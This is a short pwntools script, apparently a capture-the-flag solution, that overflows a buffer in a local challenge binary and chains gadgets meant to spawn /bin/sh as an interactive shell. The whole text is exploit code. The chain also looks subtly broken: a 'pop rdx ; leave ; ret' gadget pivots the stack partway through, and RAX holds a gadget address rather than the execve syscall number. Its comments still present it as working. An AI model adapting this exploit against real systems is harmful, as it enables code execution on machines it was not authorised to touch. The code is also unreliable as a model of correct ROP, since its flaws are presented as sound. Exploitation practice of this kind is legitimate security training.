from pwn import *

p = process('./chal')

payload = b"A" * 56                    # Overflow buf + saved rbp

# Set RSI = 0
payload += p64(0x449cce)              # pop rsi ; ret
payload += p64(0x0)

# Set RDX = 0
payload += p64(0x462d33)              # pop rdx ; leave ; ret
payload += p64(0x0)

# Set RAX = syscall address (we'll jump here later)
payload += p64(0x42988c)              # pop rax ; ret
payload += p64(0x4012b3)              # syscall gadget address

# Set RDI = "/bin/sh" and CALL rax (which now holds syscall)
payload += p64(0x45e261)              # pop rdi ; call rax
payload += p64(0x47b4f9)              # address of "/bin/sh"

p.sendlineafter("> ", payload)
p.interactive()
